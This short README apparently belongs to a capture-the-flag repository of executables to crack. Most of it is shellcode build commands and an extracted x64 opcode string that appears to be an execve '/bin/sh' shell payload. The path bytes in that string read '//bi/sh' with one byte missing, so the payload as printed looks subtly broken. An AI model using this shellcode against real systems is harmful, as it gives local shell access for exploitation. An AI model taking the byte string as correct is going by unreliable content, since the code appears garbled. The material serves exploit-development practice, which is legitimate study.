# CTF
- Each folder contains different types of executables to crack!
- Enjoy :)


# Use of shellcode
1. nasm -f ELF shellcode32.asm && ld -m elf_i386 shellcode32.o -o shellcode32
2. nasm -f elf64 shellcode64.asm && ld shellcode64.o -o shellcode64

# Now we want the opcodes as a payload
1. root@kali:~# ./grab-bytes.sh shellcode64.o 
"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05" 
